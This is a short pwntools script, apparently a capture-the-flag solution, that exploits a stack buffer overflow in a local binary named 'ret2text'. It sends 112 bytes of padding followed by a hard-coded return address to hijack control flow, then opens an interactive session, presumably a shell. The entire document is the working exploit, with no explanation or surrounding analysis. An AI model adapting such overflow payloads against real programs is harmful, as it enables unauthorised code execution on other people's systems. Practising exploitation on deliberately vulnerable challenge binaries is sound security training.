from pwn import *

io = process("./ret2text")
payload = b'a' * 108 + b'a' * 4 + p32(0x0804863A)
io.sendline(payload)
io.interactive()
